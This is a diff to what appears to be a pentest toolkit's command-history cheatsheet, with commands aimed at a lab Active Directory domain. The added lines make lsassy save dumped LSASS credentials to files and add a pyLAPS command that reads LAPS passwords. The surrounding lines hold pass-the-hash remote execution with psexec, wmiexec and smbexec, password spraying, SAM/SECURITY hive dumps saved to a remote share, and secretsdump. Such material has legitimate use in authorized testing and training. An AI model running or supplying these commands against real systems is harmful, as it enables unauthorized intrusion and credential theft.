@@ -43,7 +43,7 @@ proxychains psexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains atexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains wmiexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains dcomexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
-proxychains lsassy -d BREAKING.BAD -u Administrator -p 'p@ssword' SV01.BREAKING.BAD
+proxychains lsassy -d BREAKING.BAD -u Administrator -p 'p@ssword' -K lsass_loot -o lsass_creds.txt SV01.BREAKING.BAD
 psexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 smbexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
@@ -57,10 +57,10 @@ cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=exegol4thewin
 sprayhound -d 'BREAKING.BAD' -dc 'DC01.BREAKING.BAD' -nu 'neo4j' -np 'exegol4thewin' -lu 'anonymous' -lp 'anonymous' -p 'azerty'
 sprayhound -d 'BREAKING.BAD' -dc 'DC01.BREAKING.BAD' -nu 'neo4j' -np 'exegol4thewin' -lu 'anonymous' -lp 'anonymous'
-lsassy -v -u 'Administrator' -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
-lsassy -v -d 'BREAKING.BAD' -u 'Administrator' -p 'passw0rd' 192.168.56.0/24
+lsassy -v -u 'Administrator' -H a88baa3fdc8f581ee0fb05d7054d43e4 -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
+lsassy -v -d 'BREAKING.BAD' -u 'Administrator' -p 'passw0rd' -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
 export KRB5CCNAME=Administrator.ccache
-lsassy -d BREAKING.BAD -u Administrator -k SV01.BREAKING.BAD
+lsassy -k -d BREAKING.BAD -u Administrator -K lsass_loot -o lsass_creds.txt SV01.BREAKING.BAD
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
 gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
@@ -335,4 +335,5 @@ reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 
 reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\SHUTDOWN'
 reg.py 'domain.local/backup_operator:somepassword@192.168.56.101' backup -o '\\192.168.56.1\SHUTDOWN'
 secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+pyLAPS.py --action get -d 'domain.local' -u 'someuser' -p 'somepassword' --dc-ip 192.168.56.101
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
